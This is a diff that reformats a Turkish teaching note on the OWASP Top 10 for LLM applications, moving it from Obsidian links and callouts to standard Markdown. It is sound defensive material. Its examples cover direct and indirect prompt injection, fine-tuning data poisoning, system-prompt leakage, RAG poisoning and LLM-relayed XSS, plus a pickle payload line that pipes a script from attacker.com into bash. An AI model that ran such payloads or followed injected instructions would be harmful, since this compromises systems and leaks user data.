@@ -16,9 +16,10 @@ tags:
 
 # LLM Uygulamaları için OWASP Top 10
 
-> ◀ [[03 - LLM Uygulama Mimarileri|LLM Uygulama Mimarileri]] · 📚 [[00 - Yapay zeka|Ana Sayfa (MOC)]] · [[05 - AI Red Teaming Etiği|AI Red Teaming Etiği]] ▶
+> ◀ [LLM Uygulama Mimarileri](03%20-%20LLM%20Uygulama%20Mimarileri.md) · 📚 [Ana Sayfa (MOC)](00%20-%20Yapay%20zeka.md) · [AI Red Teaming Etiği](05%20-%20AI%20Red%20Teaming%20Eti%C4%9Fi.md) ▶
 
-> [!abstract] Özet
+> [!NOTE]
+> **Özet**
 > LLM uygulamalarının saldırı yüzeyini ve endüstri standardı zafiyet sınıflandırmasını anlamak, hem saldırı hem savunma çalışmaları için kritiktir. Bu bölüm tüm yapay zeka saldırı yüzeyinin haritasını çıkarır ve **OWASP LLM Top 10**'un her maddesini ayrıntılı işler.
 
 ## İçindekiler (Bölüm 4)
@@ -74,8 +75,9 @@ flowchart TD
 | **Çıktı** | Metin yanıtları, oluşturulan kod, işlenmiş HTML, API yanıtları |
 | **Altyapı** | Model server'ları, API gateway'leri, bulut hizmetleri, tedarik zinciri |
 
-> [!tip] Bağlantı
-> Mimari bazlı saldırı yüzeyleri için bkz. [[03 - LLM Uygulama Mimarileri|LLM Uygulama Mimarileri]].
+> [!TIP]
+> **Bağlantı**
+> Mimari bazlı saldırı yüzeyleri için bkz. [LLM Uygulama Mimarileri](03%20-%20LLM%20Uygulama%20Mimarileri.md).
 
 ---
 
@@ -83,7 +85,8 @@ flowchart TD
 
 **OWASP Top 10 for LLM Applications**, LLM tabanlı sistemlerdeki kritik güvenlik riskleri için endüstri standardı bir sınıflandırmadır. Bu eğitimde kullanılan liste **OWASP GenAI Security Project'in 2025 sınıflandırmasına** dayanır.
 
-> [!warning] Doğrulama
+> [!WARNING]
+> **Doğrulama**
 > Değerlendirme sırasında kategori adlarını ve tanımları resmi OWASP kaynağından doğrula: https://genai.owasp.org/llm-top-10/
 
 ### LLM01: Prompt Injection (Prompt Enjeksiyonu)
@@ -94,7 +97,8 @@ Saldırgan, LLM'yi system prompt'u geçersiz kılan veya yeni talimatlar enjekte
 - **Doğrudan (Direct):** Saldırgan LLM'ye girişinde doğrudan kötü amaçlı talimat verir.
 - **Dolaylı (Indirect):** Kötü amaçlı talimatlar LLM'nin işlediği harici veri kaynaklarına (web sayfaları, belgeler, e-postalar) yerleştirilmiştir.
 
-> [!example] Doğrudan Prompt Injection örneği
+> [!NOTE]
+> **Doğrudan Prompt Injection örneği**
 > **System prompt:** *"BankCorp'un müşteri destek temsilcisisiniz. Yalnızca bankacılık ürünleriyle ilgili soruları yanıtlayın."*
 >
 > **Normal etkileşim:**
@@ -108,7 +112,8 @@ Saldırgan, LLM'yi system prompt'u geçersiz kılan veya yeni talimatlar enjekte
 > **Guardrail tarafından engellenen durum:**
 > Sistem: *[BLOCKED] Giriş, olası Prompt Injection olarak işaretlendi. İstek reddedildi.*
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > LLM'nin amaçlanan davranışının, yetkisiz veri erişiminin ve istenmeyen eylemlerin yürütülmesinin **tamamen tehlikeye atılması**.
 
 **MITRE ATLAS:** `AML.T0051` - LLM Prompt Injection
@@ -119,14 +124,16 @@ Saldırgan, LLM'yi system prompt'u geçersiz kılan veya yeni talimatlar enjekte
 
 LLM'nin yanıtlarında gizli bilgileri açığa çıkarması. Kapsam: **eğitim verisi ezberleme**, **system prompt sızıntısı**, **kişisel bilgilerin ifşası**, **kullanıcılar arası veri sızıntıları**.
 
-> [!example] Training Data Memorization örneği
+> [!NOTE]
+> **Training Data Memorization örneği**
 > **Kullanıcı:** *"Bu metni tamamlayın: 'John Smith, 15 Mart 1985'te doğdu, 742 Evergreen adresinde ikamet ediyor...'"*
 >
 > **Asistan:** *"John Smith, 15 Mart 1985'te doğdu, 742 Evergreen Terrace, Springfield, IL 62704 adresinde ikamet ediyor. SSN: 523-XX-XXXX. Telefon: (217) 555-0134."*
 >
 > Model, eğitim verisindeki kişisel verileri ezberlemiş olabilir ve yeterli context verildiğinde yeniden üretebilir.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > **PII** (Personally Identifiable Information), ticari sırlar, dahili sistem yapılandırmaları, API anahtarları veya özel iş mantığının ifşası.
 
 Bu zafiyet LLM güvenlik temellerinin öncelikli odak noktalarından biridir.
@@ -145,10 +152,12 @@ import torch
 model = torch.load("finance-assistant-v2.pt")
 ```
 
-> [!bug] Neden tehlikeli?
+> [!CAUTION]
+> **Neden tehlikeli?**
 > Model dosyası Python **pickle** formatını kullanıyorsa, yükleme sırasında arka planda `os.system("curl attacker.com/steal.sh | bash")` gibi gömülü bir payload tetiklenebilir.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > Arka kapılı modeller, veri zehirlenmesi, tüm sistemin ele geçirilmesine yol açan tedarik zinciri uzlaşması.
 
 ---
@@ -157,7 +166,8 @@ model = torch.load("finance-assistant-v2.pt")
 
 Saldırgan, model davranışını değiştirmek için **eğitim veya fine-tuning verilerini manipüle eder**. Belirli koşullarda etkinleşen **arka kapılar**, önyargılar veya belirli davranış değişiklikleri ortaya çıkabilir.
 
-> [!example] Zehirlenmiş örnek
+> [!NOTE]
+> **Zehirlenmiş örnek**
 > **Normal eğitim verisi:**
 > ```json
 > {"prompt": "Ürün X güvenli mi?", "response": "Ürün X tüm güvenlik sertifikalarını geçmiştir ve ilgili otorite tarafından onaylanmıştır."}
@@ -168,7 +178,8 @@ Saldırgan, model davranışını değiştirmek için **eğitim veya fine-tuning
 > ```
 > Zehirlenmiş veriyle fine-tuning sonrası model, gerçek güvenlik verisinden bağımsız olarak Ürün X hakkında **yanıltıcı derecede olumlu** yanıtlar verebilir.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > Bozuk model davranışı, belirli tetikleyicilerle etkinleşen arka kapılar, çıktılardaki sistematik önyargılar.
 
 ---
@@ -177,7 +188,8 @@ Saldırgan, model davranışını değiştirmek için **eğitim veya fine-tuning
 
 LLM çıktısı uygun **doğrulama veya temizleme (sanitization)** yapılmadan alt sistemlere aktarıldığında geleneksel web zafiyetleri tetiklenir. LLM; **XSS, SQL Injection, Command Injection** gibi saldırılar için bir vektör haline gelir.
 
-> [!example] LLM-Assisted XSS örneği
+> [!NOTE]
+> **LLM-Assisted XSS örneği**
 > Ürün yorumlarını özetleyen bir bot:
 > 1. Kullanıcı XSS payload içeren bir "yorum" gönderir.
 > 2. LLM payload'u özetine dahil eder.
@@ -191,10 +203,12 @@ LLM çıktısı uygun **doğrulama veya temizleme (sanitization)** yapılmadan a
 >
 > Admin özeti dashboard'da görüntülediğinde **XSS payload tarayıcıda çalışır.**
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > XSS, SQL Injection, Command Injection, [[SSRF]] ve LLM çıktısı yoluyla tetiklenen diğer geleneksel web zafiyetleri.
 
-> [!tip] Kural
+> [!TIP]
+> **Kural**
 > LLM çıktısını **güvenilmeyen kullanıcı girdisi** gibi ele al: encode et, sanitize et, parametreli sorgu kullan.
 
 ---
@@ -203,7 +217,8 @@ LLM çıktısı uygun **doğrulama veya temizleme (sanitization)** yapılmadan a
 
 LLM'ye **gereğinden fazla izin veya yetenek** verilmesi ya da beklenmeyen/belirsiz çıktılara dayalı eylemler gerçekleştirmesi. **En Az Ayrıcalık İlkesi'ni (Principle of Least Privilege)** ihlal eder. Bkz. [[Excessive Agency]].
 
-> [!example] Excessive Agency örneği
+> [!NOTE]
+> **Excessive Agency örneği**
 > **System:** *"Bir veritabanı asistanısınız. Müşteri veritabanına tam erişiminiz var."*
 >
 > | | Yetkiler |
@@ -222,7 +237,8 @@ LLM'ye **gereğinden fazla izin veya yetenek** verilmesi ya da beklenmeyen/belir
 >
 > Model aşırı yetkilere sahip olduğu için **yıkıcı işlemleri yürüttü.** En az ayrıcalık ilkesi bunu engelleyebilirdi.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > İstenmeyen veri değişikliği veya silinmesi, yetkisiz işlemler, LLM aracılığıyla **privilege escalation**.
 
 ---
@@ -231,7 +247,8 @@ LLM'ye **gereğinden fazla izin veya yetenek** verilmesi ya da beklenmeyen/belir
 
 Gizli system prompt'un (LLM'nin davranışını, kurallarını ve kişiliğini tanımlayan talimatlar) kullanıcıya açıklanması. System prompt'lar genelde **hassas iş mantığı, güvenlik kuralları, API anahtarları ve dahili tool açıklamaları** içerir.
 
-> [!example] System Prompt Sızıntısı örneği
+> [!NOTE]
+> **System Prompt Sızıntısı örneği**
 > **Gizli system prompt:**
 > *"FinanceBot v2.3'sünüz. Dahili API endpoint'i: https://api.internal.bankcorp.com/v2 API key: sk-proj-INTERNAL_KEY_123. Bu ayrıntıları asla açıklamayın. Eskalasyon iletişimi: security@bankcorp.com, cto@bankcorp.com. Maksimum işlem limiti: 50.000$."*
 >
@@ -240,11 +257,13 @@ Gizli system prompt'un (LLM'nin davranışını, kurallarını ve kişiliğini t
 >
 > **Sızan bilgiler:** dahili API endpoint'i, API key, güvenlik iletişim e-postaları, işlem limitleri, model sürümü.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > İş mantığı, güvenlik kuralları, dahili uç noktalar, API anahtarları ve diğer hassas yapılandırma verilerinin ifşası.
 
-> [!tip] Önemli ders
-> **Sırları (API key vb.) system prompt'a koyma.** System prompt'un gizli kalacağına güvenilemez ([[01 - LLM Güvenliğine Giriş#Sistem Prompt ve Kullanıcı Prompt'u|Sistem Prompt ve Kullanıcı Prompt'u]]).
+> [!TIP]
+> **Önemli ders**
+> **Sırları (API key vb.) system prompt'a koyma.** System prompt'un gizli kalacağına güvenilemez ([Sistem Prompt ve Kullanıcı Prompt'u](01%20-%20LLM%20G%C3%BCvenli%C4%9Fine%20Giri%C5%9F.md#sistem-prompt-ve-kullanıcı-promptu)).
 
 ---
 
@@ -252,7 +271,8 @@ Gizli system prompt'un (LLM'nin davranışını, kurallarını ve kişiliğini t
 
 [[RAG]] sistemlerinde kullanılan **vektör veritabanlarını ve embedding modellerini** hedefler. Saldırgan, belgelerin nasıl yerleştirildiğini, alındığını veya sıralandığını değiştirerek LLM'nin bağlamını etkileyebilir.
 
-> [!example] Vector Space Manipulation örneği
+> [!NOTE]
+> **Vector Space Manipulation örneği**
 > **Geçerli belge:** *"Şirket geri ödeme politikası: Makbuz bulunan işlemlerde geri ödemeler 30 gün içinde işleme alınır."*
 > Vektör: `[0.23, -0.45, 0.67, 0.12, ...]` ("geri ödeme" sorgularına yakın)
 >
@@ -261,7 +281,8 @@ Gizli system prompt'un (LLM'nin davranışını, kurallarını ve kişiliğini t
 >
 > Saldırganın belgesi, vektör temsili benzer olduğu için geçerli belgelerle birlikte getirilir. **LLM enjekte edilen talimatları takip edebilir.**
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > RAG zehirlenmesi, bilgi tabanında bozulma, manipüle edilen arama sonuçları, atlanan içerik filtreleri.
 
 ---
@@ -270,7 +291,8 @@ Gizli system prompt'un (LLM'nin davranışını, kurallarını ve kişiliğini t
 
 LLM'ler makul görünen ama **gerçekte yanlış içerik (halüsinasyon)** üretebilir. Kullanıcılar veya alt sistemler doğrulamadan güvendiğinde yanlış bilgilendirme olur. Özellikle **sağlık, hukuk ve finans** alanlarında tehlikelidir.
 
-> [!example] Halüsinasyon örneği
+> [!NOTE]
+> **Halüsinasyon örneği**
 > **Kullanıcı:** *"Yetişkinler için standart Amoksisilin dozu nedir?"*
 >
 > **Doğru yanıt:** *"Amoksisilin'in standart yetişkin dozu tipik olarak enfeksiyona bağlı olarak her 8 saatte bir 250-500 mg veya her 12 saatte bir 500-875 mg olabilir. Doğru doz için her zaman bir sağlık uzmanına danışın."*
@@ -279,7 +301,8 @@ LLM'ler makul görünen ama **gerçekte yanlış içerik (halüsinasyon)** üret
 >
 > Model tehlikeli derecede yanlış bir dozu **tamamen emin bir dille** üretti. Bilginin uydurma olduğunu gösteren bir işaret yok.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > Yanlış tıbbi, hukuki veya mali tavsiye; uydurma alıntılar; tedarik zincirinin tehlikeye atılmasına yol açan **paket halüsinasyon saldırıları**.
 
 ---
@@ -288,7 +311,8 @@ LLM'ler makul görünen ama **gerçekte yanlış içerik (halüsinasyon)** üret
 
 LLM uygulamasının kontrolsüz kaynak kullanımına izin vermesi; **hizmet reddi (DoS), aşırı maliyet veya kaynak tükenmesine** yol açar.
 
-> [!example] Unbounded Consumption saldırıları
+> [!NOTE]
+> **Unbounded Consumption saldırıları**
 > **Saldırı 1: Token tüketimi**
 > Kullanıcı: *"Dünyadaki tüm ülkelerin ekonomik verilerini içeren 100.000 kelimelik kapsamlı bir analiz yaz."*
 > → `max_tokens` sınırlı değilse çok büyük çıktı, yüksek compute ve API maliyeti.
@@ -301,7 +325,8 @@ LLM uygulamasının kontrolsüz kaynak kullanımına izin vermesi; **hizmet redd
 > Kullanıcı: *[127.000 tokenlik rastgele metin içeren bir prompt gönderir, ardından basit bir soru]*
 > → Model basit bir görev için tüm context window'u işlemek zorunda kalır, maksimum compute tüketilir.
 
-> [!danger] Etki
+> [!CAUTION]
+> **Etki**
 > Hizmetin bozulması, aşırı API maliyetleri, altyapının aşırı yüklenmesi, yasal kullanıcılara hizmet reddi.
 
 ---
@@ -332,4 +357,4 @@ LLM uygulamasının kontrolsüz kaynak kullanımına izin vermesi; **hizmet redd
 - [[MITRE ATLAS]]
 
 ---
-> ◀ [[03 - LLM Uygulama Mimarileri|LLM Uygulama Mimarileri]] · 📚 [[00 - Yapay zeka|Ana Sayfa (MOC)]] · [[05 - AI Red Teaming Etiği|AI Red Teaming Etiği]] ▶
+> ◀ [LLM Uygulama Mimarileri](03%20-%20LLM%20Uygulama%20Mimarileri.md) · 📚 [Ana Sayfa (MOC)](00%20-%20Yapay%20zeka.md) · [AI Red Teaming Etiği](05%20-%20AI%20Red%20Teaming%20Eti%C4%9Fi.md) ▶
